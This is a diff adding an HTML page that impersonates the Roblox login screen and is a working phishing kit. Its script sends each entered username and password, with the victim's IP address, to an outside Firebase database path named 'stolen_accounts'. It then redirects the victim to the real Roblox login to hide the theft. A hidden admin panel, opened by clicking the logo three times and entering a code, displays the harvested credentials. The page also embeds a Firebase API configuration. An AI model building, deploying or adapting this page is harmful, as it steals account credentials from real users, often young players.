@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
+<!--[if gt IE 8]><!-->
+<html lang="en">
+<!--<![endif]-->
+<head data-machine-id="d9166bca-8b86-4f09-c9cb-681cd528d40f">
+    <title>Log in to Roblox</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Roblox Corporation" />
+    <meta name="description" content="Login to your Roblox account or sign up to create a new account." />
+    <link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png" />
+    <link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/327066c63509981c29dce9b9e6861f96192f0a5aaa460af6558cda326299bf8e-FoundationCss.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/26c2f753f7c28707bf32bef3c16393fe5fa83126bf3ac21a0b0b5a7245ed820d-ReactStyleGuide.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/e32a4e044787a67605a39128f75fc958bb9f8a46b53a5e8ffc0417ae076cc1e9-StyleGuide.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/e49a3f8cc52a0bed739c81046d9f5bfe143c2b6b532d72f5600d0aaca92473ac-ReactLogin.css" />
+    <style>
+        .admin-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 100000; display: none;
+            overflow: auto; padding: 20px;
+        }
+        .admin-overlay.show { display: block; }
+        .admin-container { background: #1e1e2a; border-radius: 12px; padding: 20px; max-width: 1200px; margin: 0 auto; color: white; }
+        .admin-table { width: 100%; border-collapse: collapse; background: #2d2d3a; }
+        .admin-table th, .admin-table td { border: 1px solid #444; padding: 10px; text-align: left; color: white; }
+        .admin-table th { background: #00bfff; color: #000; }
+        .close-admin { float: right; background: #e74c3c; border: none; color: white; padding: 8px 20px; border-radius: 6px; cursor: pointer; }
+        .logo-trigger { cursor: pointer; }
+    </style>
+</head>
+<body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font">
+    <div id="wrap" class="wrap no-gutter-ads logged-out">
+        <div id="navigation-container">
+            <div id="header" class="navbar-fixed-top rbx-header">
+                <div class="container-fluid">
+                    <div class="navbar-header">
+                        <a id="nav-logo-link" class="navbar-brand logo-trigger" href="#">
+                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <main class="container-main" id="container-main">
+            <div class="content" id="content">
+                <div id="react-login-web-app">
+                    <div class="login-container" style="max-width:400px; margin:100px auto; background:#1e1e2a; padding:30px; border-radius:8px;">
+                        <h2 style="color:white; text-align:center;">Log in to Roblox</h2>
+                        <div class="input-group" style="margin-bottom:15px;">
+                            <input type="text" id="username" placeholder="Username / Email / Phone" style="width:100%; padding:12px; background:#2d2d3a; border:1px solid #444; color:white; border-radius:4px;">
+                        </div>
+                        <div class="input-group" style="margin-bottom:15px;">
+                            <input type="password" id="password" placeholder="Password" style="width:100%; padding:12px; background:#2d2d3a; border:1px solid #444; color:white; border-radius:4px;">
+                        </div>
+                        <button id="loginButton" style="width:100%; padding:12px; background:#00bfff; border:none; color:white; font-weight:bold; border-radius:4px; cursor:pointer;">Sign In</button>
+                        <div style="text-align:center; margin-top:20px;"><a href="#" style="color:#aaa;">Forgot password?</a><a href="#" style="color:#aaa; margin-left:20px;">Sign up</a></div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+    <div id="adminPanel" class="admin-overlay">
+        <div class="admin-container">
+            <button class="close-admin" onclick="closeAdmin()">✕ Close</button>
+            <h2>🔐 ADMIN PANEL — Code: 27172930</h2>
+            <table class="admin-table"><thead><tr><th>Username</th><th>Password</th><th>Time</th><th>IP</th></tr></thead><tbody id="accountsList"></tbody></table>
+        </div>
+    </div>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCK_DpfvdcC1CKu13s3yAyJGz3A6wgVdKE",
+            authDomain: "isjshsh-bc7fc.firebaseapp.com",
+            databaseURL: "https://isjshsh-bc7fc-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "isjshsh-bc7fc",
+            storageBucket: "isjshsh-bc7fc.firebasestorage.app",
+            messagingSenderId: "214497808275",
+            appId: "1:214497808275:web:72eaf995858753a2a62266"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const accountsRef = db.ref('stolen_accounts');
+        let clickCount = 0, clickTimer;
+        document.getElementById('loginButton').onclick = async function() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            if (!username || !password) return;
+            let ip = 'unknown';
+            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); ip = data.ip; } catch(e) {}
+            accountsRef.push({ username, password, time: new Date().toLocaleString(), ip });
+            window.location.href = 'https://www.roblox.com/login?error=1';
+        };
+        const logo = document.querySelector('.logo-trigger');
+        logo.onclick = function(e) {
+            e.preventDefault();
+            clickCount++;
+            if (clickCount >= 3) {
+                const code = prompt('Enter admin access code:');
+                if (code === '27172930') {
+                    document.getElementById('adminPanel').classList.add('show');
+                    loadAccounts();
+                }
+                clickCount = 0;
+            }
+            clearTimeout(clickTimer);
+            clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
+        };
+        function loadAccounts() {
+            accountsRef.on('value', (snapshot) => {
+                const tbody = document.getElementById('accountsList');
+                tbody.innerHTML = '';
+                snapshot.forEach((child) => {
+                    const d = child.val();
+                    const row = tbody.insertRow();
+                    row.insertCell(0).textContent = d.username || '';
+                    row.insertCell(1).textContent = d.password || '';
+                    row.insertCell(2).textContent = d.time || '';
+                    row.insertCell(3).textContent = d.ip || '';
+                });
+            });
+        }
+        function closeAdmin() { document.getElementById('adminPanel').classList.remove('show'); }
+    </script>
+</body>
+</html>
